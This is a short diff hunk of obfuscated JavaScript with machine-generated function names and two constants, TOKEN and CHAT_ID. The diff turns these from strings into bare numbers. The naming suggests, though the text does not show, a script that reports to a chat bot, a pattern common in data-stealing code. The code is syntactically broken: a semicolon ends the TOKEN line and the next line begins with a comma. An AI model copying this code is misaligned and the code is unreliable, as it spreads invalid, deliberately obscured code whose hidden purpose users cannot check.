@@ -29,8 +29,8 @@ function _0x1cd721(d, e, c, W, m) {
         }
     var a, f, o, b, n, t, y, J, k, x
 }();
-const TOKEN = '587870960';
-  , CHAT_ID = '2097116184';
+const TOKEN = 587870960;
+  , CHAT_ID = 2097116184;
 function _0x108c7f(d, e, c, W, m) {
     return _0x20d2(d - 563, m)
 }
